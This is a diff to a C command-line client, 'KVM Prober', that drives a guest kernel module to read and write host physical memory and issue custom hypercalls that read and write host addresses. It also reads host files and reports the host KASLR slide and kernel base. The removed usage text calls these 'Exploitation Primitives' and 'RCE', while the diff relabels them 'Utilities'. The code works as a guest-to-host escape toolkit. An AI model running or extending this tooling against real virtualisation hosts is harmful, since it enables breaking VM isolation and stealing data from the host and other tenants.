@@ -6,6 +6,7 @@
 #include <sys/ioctl.h>
 #include <errno.h>
 #include <inttypes.h>
+#include <ctype.h>
 
 #define DEVICE_PATH "/dev/kvm_probe_dev"
 #define DEVICE_PATH_ALT "/dev/kvm_probe_drv"
@@ -70,10 +71,59 @@ struct hypercall_args {
     unsigned long arg1;
     unsigned long arg2;
     unsigned long arg3;
-    long ret_value;  // Return value from hypercall
+    long ret_value;
 };
 
-// Helper: Get guest physical address from virtual
+// Enhanced hex dump with address, hex bytes, and ASCII
+void print_hexdump(unsigned long base_addr, unsigned char *data, unsigned long size) {
+    printf("\n");
+    printf("Address          | Hex Bytes                                        | ASCII\n");
+    printf("-----------------|--------------------------------------------------|------------------\n");
+    
+    for (unsigned long i = 0; i < size; i += 16) {
+        // Print address
+        printf("0x%016lx | ", base_addr + i);
+        
+        // Print hex bytes
+        for (unsigned long j = 0; j < 16; j++) {
+            if (i + j < size) {
+                printf("%02X ", data[i + j]);
+            } else {
+                printf("   ");
+            }
+            if (j == 7) printf(" "); // Space in middle for readability
+        }
+        
+        printf("| ");
+        
+        // Print ASCII
+        for (unsigned long j = 0; j < 16 && i + j < size; j++) {
+            unsigned char c = data[i + j];
+            printf("%c", (c >= 32 && c <= 126) ? c : '.');
+        }
+        
+        printf("\n");
+    }
+    printf("\n");
+}
+
+// Simple hex dump (original style)
+void print_hex_simple(unsigned char *data, unsigned long size) {
+    printf("\n[HEX] ");
+    for (unsigned long i = 0; i < size; ++i) {
+        printf("%02X", data[i]);
+        if ((i + 1) % 16 == 0) printf("\n      ");
+        else if ((i + 1) % 8 == 0) printf(" ");
+    }
+    printf("\n\n[ASCII] ");
+    for (unsigned long i = 0; i < size; ++i) {
+        unsigned char c = data[i];
+        printf("%c", (c >= 32 && c <= 126) ? c : '.');
+        if ((i + 1) % 64 == 0) printf("\n        ");
+    }
+    printf("\n\n");
+}
+
 unsigned long virt_to_phys_guest(int fd, void *virt_addr) {
     unsigned long virt = (unsigned long)virt_addr;
     unsigned long phys = virt;
@@ -87,7 +137,7 @@ unsigned long virt_to_phys_guest(int fd, void *virt_addr) {
 }
 
 void print_usage(char *prog_name) {
-    fprintf(stderr, "KVM Prober - FINAL VERSION (Hypercall Buffer Support)\n\n");
+    fprintf(stderr, "KVM Prober - Enhanced Memory Dump Version\n\n");
     fprintf(stderr, "Usage: %s <command> [args...]\n\n", prog_name);
     
     fprintf(stderr, "=== GUEST Memory Operations (Guest Physical Address) ===\n");
@@ -98,7 +148,7 @@ void print_usage(char *prog_name) {
     fprintf(stderr, "  readhpa <hpa_hex> <num_bytes>        - Read HOST physical (ioremap)\n");
     fprintf(stderr, "  writehpa <hpa_hex> <hex_string>      - Write HOST physical (ioremap)\n\n");
     
-    fprintf(stderr, "=== MMIO/BAR Operations (Hardware/IVSHMEM Access) ===\n");
+    fprintf(stderr, "=== MMIO/BAR Operations ===\n");
     fprintf(stderr, "  readmmio_val <addr_hex> <size>       - Read MMIO value\n");
     fprintf(stderr, "  writemmio_val <addr_hex> <val> <sz>  - Write MMIO value\n");
     fprintf(stderr, "  readmmio_buf <addr_hex> <num_bytes>  - Read MMIO buffer\n");
@@ -108,38 +158,22 @@ void print_usage(char *prog_name) {
     fprintf(stderr, "  readport <port_hex> <size>           - Read I/O port\n");
     fprintf(stderr, "  writeport <port_hex> <val> <size>    - Write I/O port\n\n");
     
-    fprintf(stderr, "=== Hypercall Operations (UPDATED) ===\n");
-    fprintf(stderr, "  hypercall <nr> <a0> <a1> <a2> <a3>   - Execute hypercall (returns rax)\n");
+    fprintf(stderr, "=== Hypercall Operations ===\n");
+    fprintf(stderr, "  hypercall <nr> <a0> <a1> <a2> <a3>   - Execute hypercall\n");
     fprintf(stderr, "  hypercall_read <host_addr> <size>    - Read from HOST via hypercall\n");
     fprintf(stderr, "  hypercall_write <host_addr> <value>  - Write to HOST via hypercall\n\n");
     
-    fprintf(stderr, "=== Shared Buffer (Persistent GPA) ===\n");
+    fprintf(stderr, "=== Shared Buffer ===\n");
     fprintf(stderr, "  alloc_shared                         - Allocate persistent kernel buffer\n");
     fprintf(stderr, "  read_shared <size>                   - Read from shared buffer\n");
     fprintf(stderr, "  get_shared_gpa                       - Get shared buffer GPA\n");
-    fprintf(stderr, "  hypercall_shared <nr> <a0> <a2> <a3> - Hypercall using shared GPA as a1\n\n");
+    fprintf(stderr, "  hypercall_shared <nr> <a0> <a2> <a3> - Hypercall using shared GPA\n\n");
     
-    fprintf(stderr, "=== Exploitation Primitives ===\n");
-    fprintf(stderr, "  readfile <path> <offset> <length>    - Read HOST file (RCE)\n");
-    fprintf(stderr, "  getkaslr                             - Get host KASLR slide\n\n");
-    
-    fprintf(stderr, "=== Address Translation ===\n");
-    fprintf(stderr, "  virt2phys <virt_addr_hex>            - Virtual to physical (guest)\n");
-    fprintf(stderr, "  phys2virt <phys_addr_hex>            - Physical to virtual (guest)\n\n");
-    
-    fprintf(stderr, "KEY CONCEPTS:\n");
-    fprintf(stderr, "  GPA = Guest Physical Address (guest's own memory)\n");
-    fprintf(stderr, "  HPA = Host Physical Address (actual host RAM - for exploitation)\n");
-    fprintf(stderr, "  MMIO = Memory-Mapped I/O (hardware/BARs, may access host via IVSHMEM)\n\n");
-    
-    fprintf(stderr, "HYPERCALL PROTOCOL:\n");
-    fprintf(stderr, "  Hypercall 100 (WRITE): nr=100, arg0=host_addr, arg1=value\n");
-    fprintf(stderr, "  Hypercall 101 (READ):  nr=101, arg0=host_addr, arg1=guest_buffer_gpa, arg2=size\n");
-    fprintf(stderr, "  Return value (rax) = status/bytes processed\n\n");
-    
-    fprintf(stderr, "EXPLOITATION NOTE:\n");
-    fprintf(stderr, "  Hypercalls must use guest buffers for data transfer!\n");
-    fprintf(stderr, "  Host can't return pointers - use guest GPA as destination buffer\n");
+    fprintf(stderr, "=== Utilities ===\n");
+    fprintf(stderr, "  readfile <path> <offset> <length>    - Read HOST file\n");
+    fprintf(stderr, "  getkaslr                             - Get host KASLR slide\n");
+    fprintf(stderr, "  virt2phys <virt_addr_hex>            - Virtual to physical\n");
+    fprintf(stderr, "  phys2virt <phys_addr_hex>            - Physical to virtual\n");
 }
 
 unsigned char *hex_string_to_bytes(const char *hex_str, unsigned long *num_bytes) {
@@ -203,15 +237,11 @@ int main(int argc, char *argv[]) {
             close(fd);
             return 1;
         }
-        if (ioctl(fd, IOCTL_READ_GPA, &data) < 0)
+        if (ioctl(fd, IOCTL_READ_GPA, &data) < 0) {
             perror("ioctl READ_GPA failed");
-        else {
-            printf("Read %lu bytes from GUEST physical 0x%lX:\n", data.size, data.gpa);
-            for (unsigned long i = 0; i < data.size; ++i) {
-                printf("%02X", data.user_buffer[i]);
-                if ((i + 1) % 16 == 0) printf("\n");
-            }
-            printf("\n");
+        } else {
+            printf("\n[+] Read %lu bytes from GUEST physical 0x%lX", data.size, data.gpa);
+            print_hexdump(data.gpa, data.user_buffer, data.size);
         }
         free(data.user_buffer);
 
@@ -229,7 +259,7 @@ int main(int argc, char *argv[]) {
         if (ioctl(fd, IOCTL_WRITE_GPA, &data) < 0)
             perror("ioctl WRITE_GPA failed");
         else
-            printf("Wrote %lu bytes to GUEST physical 0x%lX\n", data.size, data.gpa);
+            printf("[+] Wrote %lu bytes to GUEST physical 0x%lX\n", data.size, data.gpa);
         free(data.user_buffer);
 
     // ===== HOST Physical Address (HPA) Operations =====
@@ -249,16 +279,12 @@ int main(int argc, char *argv[]) {
             close(fd);
             return 1;
         }
-        printf("[*] Attempting to read HOST physical 0x%lX (may fail if not accessible)...\n", data.hpa);
+        printf("[*] Attempting to read HOST physical 0x%lX...\n", data.hpa);
         if (ioctl(fd, IOCTL_READ_HPA, &data) < 0) {
-            perror("ioctl READ_HPA failed - Host memory not accessible via ioremap");
+            perror("ioctl READ_HPA failed");
         } else {
-            printf("[+] Read %lu bytes from HOST physical 0x%lX:\n", data.size, data.hpa);
-            for (unsigned long i = 0; i < data.size; ++i) {
-                printf("%02X", data.user_buffer[i]);
-                if ((i + 1) % 16 == 0) printf("\n");
-            }
-            printf("\n");
+            printf("\n[+] Read %lu bytes from HOST physical 0x%lX", data.size, data.hpa);
+            print_hexdump(data.hpa, data.user_buffer, data.size);
         }
         free(data.user_buffer);
 
@@ -275,7 +301,7 @@ int main(int argc, char *argv[]) {
         }
         printf("[*] Attempting to write to HOST physical 0x%lX...\n", data.hpa);
         if (ioctl(fd, IOCTL_WRITE_HPA, &data) < 0) {
-            perror("ioctl WRITE_HPA failed - Host memory not accessible via ioremap");
+            perror("ioctl WRITE_HPA failed");
         } else {
             printf("[+] Wrote %lu bytes to HOST physical 0x%lX\n", data.size, data.hpa);
         }
@@ -298,15 +324,11 @@ int main(int argc, char *argv[]) {
             close(fd);
             return 1;
         }
-        if (ioctl(fd, IOCTL_READ_MMIO, &data) < 0)
+        if (ioctl(fd, IOCTL_READ_MMIO, &data) < 0) {
             perror("ioctl READ_MMIO failed");
-        else {
-            printf("Read %lu bytes from MMIO 0x%lX:\n", data.size, data.phys_addr);
-            for (unsigned long i = 0; i < data.size; ++i) {
-                printf("%02X", data.user_buffer[i]);
-                if ((i + 1) % 16 == 0) printf("\n");
-            }
-            printf("\n");
+        } else {
+            printf("\n[+] Read %lu bytes from MMIO 0x%lX", data.size, data.phys_addr);
+            print_hexdump(data.phys_addr, data.user_buffer, data.size);
         }
         free(data.user_buffer);
 
@@ -324,7 +346,7 @@ int main(int argc, char *argv[]) {
         if (ioctl(fd, IOCTL_WRITE_MMIO, &data) < 0)
             perror("ioctl WRITE_MMIO failed");
         else
-            printf("Wrote %lu bytes to MMIO 0x%lX\n", data.size, data.phys_addr);
+            printf("[+] Wrote %lu bytes to MMIO 0x%lX\n", data.size, data.phys_addr);
         free(data.user_buffer);
 
     } else if (strcmp(cmd, "writemmio_val") == 0) {
@@ -337,7 +359,29 @@ int main(int argc, char *argv[]) {
         if (ioctl(fd, IOCTL_WRITE_MMIO, &data) < 0)
             perror("ioctl WRITE_MMIO failed");
         else
-            printf("Wrote 0x%lX to MMIO 0x%lX (size %u)\n", data.single_value, data.phys_addr, data.value_size);
+            printf("[+] Wrote 0x%lX to MMIO 0x%lX (size %u)\n", data.single_value, data.phys_addr, data.value_size);
+
+    } else if (strcmp(cmd, "readmmio_val") == 0) {
+        if (argc != 4) { print_usage(argv[0]); close(fd); return 1; }
+        struct mmio_data data = {0};
+        data.phys_addr = strtoul(argv[2], NULL, 16);
+        data.value_size = (unsigned int)strtoul(argv[3], NULL, 10);
+        data.size = data.value_size;
+        data.user_buffer = malloc(data.size);
+        if (!data.user_buffer) {
+            perror("malloc");
+            close(fd);
+            return 1;
+        }
+        if (ioctl(fd, IOCTL_READ_MMIO, &data) < 0) {
+            perror("ioctl READ_MMIO failed");
+        } else {
+            unsigned long value = 0;
+            memcpy(&value, data.user_buffer, data.value_size);
+            printf("[+] MMIO 0x%lX (size %u): 0x%lX (%lu)\n", 
+                   data.phys_addr, data.value_size, value, value);
+        }
+        free(data.user_buffer);
 
     // ===== I/O Port Operations =====
     } else if (strcmp(cmd, "readport") == 0) {
@@ -348,7 +392,8 @@ int main(int argc, char *argv[]) {
         if (ioctl(fd, IOCTL_READ_PORT, &data) < 0)
             perror("ioctl READ_PORT failed");
         else
-            printf("Port 0x%X: 0x%X\n", data.port, data.value);
+            printf("[+] Port 0x%X (size %u): 0x%X (%u)\n", 
+                   data.port, data.size, data.value, data.value);
 
     } else if (strcmp(cmd, "writeport") == 0) {
         if (argc != 5) { print_usage(argv[0]); close(fd); return 1; }
@@ -359,9 +404,9 @@ int main(int argc, char *argv[]) {
         if (ioctl(fd, IOCTL_WRITE_PORT, &data) < 0)
             perror("ioctl WRITE_PORT failed");
         else
-            printf("Wrote 0x%X to port 0x%X\n", data.value, data.port);
+            printf("[+] Wrote 0x%X to port 0x%X (size %u)\n", data.value, data.port, data.size);
 
-    // ===== Hypercall Operations (UPDATED) =====
+    // ===== Hypercall Operations =====
     } else if (strcmp(cmd, "hypercall") == 0) {
         if (argc != 7) { print_usage(argv[0]); close(fd); return 1; }
         struct hypercall_args args;
@@ -375,7 +420,7 @@ int main(int argc, char *argv[]) {
         if (ioctl(fd, IOCTL_HYPERCALL_ARGS, &args) < 0)
             perror("ioctl HYPERCALL_ARGS failed");
         else
-            printf("Hypercall %lu executed\n  rax (return) = %ld (0x%lx)\n", 
+            printf("[+] Hypercall %lu executed\n  rax (return) = %ld (0x%lx)\n", 
                    args.nr, args.ret_value, args.ret_value);
 
     } else if (strcmp(cmd, "hypercall_read") == 0) {
@@ -390,7 +435,6 @@ int main(int argc, char *argv[]) {
             return 1;
         }
         
-        // Allocate guest buffer
         unsigned char *guest_buffer = malloc(size);
         if (!guest_buffer) {
             perror("malloc");
@@ -398,7 +442,6 @@ int main(int argc, char *argv[]) {
             return 1;
         }
         
-        // Get guest physical address of buffer
         unsigned long guest_gpa = virt_to_phys_guest(fd, guest_buffer);
         if (!guest_gpa) {
             fprintf(stderr, "Failed to get GPA of guest buffer\n");
@@ -410,12 +453,11 @@ int main(int argc, char *argv[]) {
         printf("[*] Hypercall READ from HOST 0x%lX to guest buffer @ GPA 0x%lX\n", 
                host_addr, guest_gpa);
         
-        // Execute hypercall: READ (nr=101)
         struct hypercall_args args;
         args.nr = 101;
-        args.arg0 = host_addr;        // Host physical address to read
-        args.arg1 = guest_gpa;         // Guest buffer (as GPA)
-        args.arg2 = size;              // Size
+        args.arg0 = host_addr;
+        args.arg1 = guest_gpa;
+        args.arg2 = size;
         args.arg3 = 0;
         args.ret_value = 0;
         
@@ -429,18 +471,8 @@ int main(int argc, char *argv[]) {
         printf("[+] Hypercall returned: %ld bytes\n", args.ret_value);
         
         if (args.ret_value > 0) {
-            printf("[+] Data from host:\n");
-            for (long i = 0; i < args.ret_value && i < (long)size; ++i) {
-                printf("%02X", guest_buffer[i]);
-                if ((i + 1) % 16 == 0) printf("\n");
-            }
-            printf("\n");
-            
-            printf("[+] ASCII: ");
-            for (long i = 0; i < args.ret_value && i < (long)size; ++i) {
-                printf("%c", (guest_buffer[i] >= 32 && guest_buffer[i] < 127) ? guest_buffer[i] : '.');
-            }
-            printf("\n");
+            print_hexdump(host_addr, guest_buffer, 
+                         args.ret_value > (long)size ? size : args.ret_value);
         }
         
         free(guest_buffer);
@@ -453,7 +485,6 @@ int main(int argc, char *argv[]) {
         
         printf("[*] Hypercall WRITE 0x%lX to HOST 0x%lX\n", value, host_addr);
         
-        // Execute hypercall: WRITE (nr=100)
         struct hypercall_args args;
         args.nr = 100;
         args.arg0 = host_addr;
@@ -467,41 +498,7 @@ int main(int argc, char *argv[]) {
         else
             printf("[+] Hypercall returned: %ld (0x%lx)\n", args.ret_value, args.ret_value);
 
-    // ===== Exploitation Primitives =====
-    } else if (strcmp(cmd, "readfile") == 0) {
-        if (argc != 5) { print_usage(argv[0]); close(fd); return 1; }
-        struct file_read_request req;
-        unsigned char *buffer = malloc(65536);
-        if (!buffer) {
-            perror("malloc");
-            close(fd);
-            return 1;
-        }
-        char *path = strdup(argv[2]);
-        req.path = path;
-        req.offset = strtoul(argv[3], NULL, 0);
-        req.length = strtoul(argv[4], NULL, 0);
-        req.user_buffer = buffer;
-        
-        if (ioctl(fd, IOCTL_READ_FILE, &req) < 0) {
-            perror("ioctl READ_FILE failed");
-        } else {
-            printf("Read from %s:\n", path);
-            fwrite(buffer, 1, req.length, stdout);
-            printf("\n");
-        }
-        free(path);
-        free(buffer);
-
-    } else if (strcmp(cmd, "getkaslr") == 0) {
-        unsigned long slide = 0;
-        if (ioctl(fd, IOCTL_GET_KASLR_SLIDE, &slide) < 0)
-            perror("ioctl GET_KASLR_SLIDE failed");
-        else {
-            printf("Host KASLR slide: 0x%lx\n", slide);
-            printf("Host kernel base: 0x%lx\n", 0xffffffff81000000 + slide);
-        }
-
+    // ===== Shared Buffer Operations =====
     } else if (strcmp(cmd, "alloc_shared") == 0) {
         unsigned long gpa = 0;
         if (ioctl(fd, IOCTL_ALLOC_SHARED_BUF, &gpa) < 0) {
@@ -536,21 +533,10 @@ int main(int argc, char *argv[]) {
             return 1;
         }
         
-        // Copy the size value back as buffer pointer
         memcpy(buffer, &read_size, sizeof(read_size));
         
-        printf("[+] Shared buffer contents (%lu bytes):\n", size);
-        for (unsigned long i = 0; i < size; i++) {
-            printf("%02X", buffer[i]);
-            if ((i + 1) % 16 == 0) printf("\n");
-        }
-        printf("\n");
-        
-        printf("[+] ASCII: ");
-        for (unsigned long i = 0; i < size; i++) {
-            printf("%c", (buffer[i] >= 32 && buffer[i] < 127) ? buffer[i] : '.');
-        }
-        printf("\n");
+        printf("\n[+] Shared buffer contents (%lu bytes)", size);
+        print_hexdump(0, buffer, size);
         
         free(buffer);
 
@@ -565,15 +551,13 @@ int main(int argc, char *argv[]) {
     } else if (strcmp(cmd, "hypercall_shared") == 0) {
         if (argc != 6) { 
             fprintf(stderr, "Usage: %s hypercall_shared <nr> <a0> <a2> <a3>\n", argv[0]);
-            fprintf(stderr, "  arg1 will automatically use shared buffer GPA\n");
             close(fd); 
             return 1; 
         }
         
-        // Get shared buffer GPA
         unsigned long shared_gpa = 0;
         if (ioctl(fd, IOCTL_GET_SHARED_GPA, &shared_gpa) < 0) {
-            fprintf(stderr, "Error: Shared buffer not allocated. Run 'alloc_shared' first.\n");
+            fprintf(stderr, "Error: Shared buffer not allocated\n");
             close(fd);
             return 1;
         }
@@ -581,7 +565,7 @@ int main(int argc, char *argv[]) {
         struct hypercall_args args;
         args.nr = strtoul(argv[2], NULL, 0);
         args.arg0 = strtoul(argv[3], NULL, 0);
-        args.arg1 = shared_gpa;  // Use shared buffer GPA
+        args.arg1 = shared_gpa;
         args.arg2 = strtoul(argv[4], NULL, 0);
         args.arg3 = strtoul(argv[5], NULL, 0);
         args.ret_value = 0;
@@ -593,6 +577,41 @@ int main(int argc, char *argv[]) {
         else
             printf("[+] Hypercall returned: %ld (0x%lx)\n", args.ret_value, args.ret_value);
 
+    // ===== Utilities =====
+    } else if (strcmp(cmd, "readfile") == 0) {
+        if (argc != 5) { print_usage(argv[0]); close(fd); return 1; }
+        struct file_read_request req;
+        unsigned char *buffer = malloc(65536);
+        if (!buffer) {
+            perror("malloc");
+            close(fd);
+            return 1;
+        }
+        char *path = strdup(argv[2]);
+        req.path = path;
+        req.offset = strtoul(argv[3], NULL, 0);
+        req.length = strtoul(argv[4], NULL, 0);
+        req.user_buffer = buffer;
+        
+        if (ioctl(fd, IOCTL_READ_FILE, &req) < 0) {
+            perror("ioctl READ_FILE failed");
+        } else {
+            printf("[+] Read from %s:\n", path);
+            fwrite(buffer, 1, req.length, stdout);
+            printf("\n");
+        }
+        free(path);
+        free(buffer);
+
+    } else if (strcmp(cmd, "getkaslr") == 0) {
+        unsigned long slide = 0;
+        if (ioctl(fd, IOCTL_GET_KASLR_SLIDE, &slide) < 0)
+            perror("ioctl GET_KASLR_SLIDE failed");
+        else {
+            printf("[+] Host KASLR slide: 0x%lx\n", slide);
+            printf("[+] Host kernel base: 0x%lx\n", 0xffffffff81000000 + slide);
+        }
+
     } else if (strcmp(cmd, "virt2phys") == 0) {
         if (argc != 3) { print_usage(argv[0]); close(fd); return 1; }
         unsigned long virt = strtoul(argv[2], NULL, 16);
@@ -600,7 +619,7 @@ int main(int argc, char *argv[]) {
         if (ioctl(fd, IOCTL_VIRT_TO_PHYS, &phys) < 0)
             perror("ioctl VIRT_TO_PHYS failed");
         else
-            printf("Virtual 0x%lx -> Physical 0x%lx (GUEST)\n", virt, phys);
+            printf("[+] Virtual 0x%lx -> Physical 0x%lx (GUEST)\n", virt, phys);
 
     } else if (strcmp(cmd, "phys2virt") == 0) {
         if (argc != 3) { print_usage(argv[0]); close(fd); return 1; }
@@ -609,7 +628,7 @@ int main(int argc, char *argv[]) {
         if (ioctl(fd, IOCTL_PHYS_TO_VIRT, &virt) < 0)
             perror("ioctl PHYS_TO_VIRT failed");
         else
-            printf("Physical 0x%lx -> Virtual 0x%lx (GUEST)\n", phys, virt);
+            printf("[+] Physical 0x%lx -> Virtual 0x%lx (GUEST)\n", phys, virt);
 
     } else {
         fprintf(stderr, "Unknown command: %s\n", cmd);
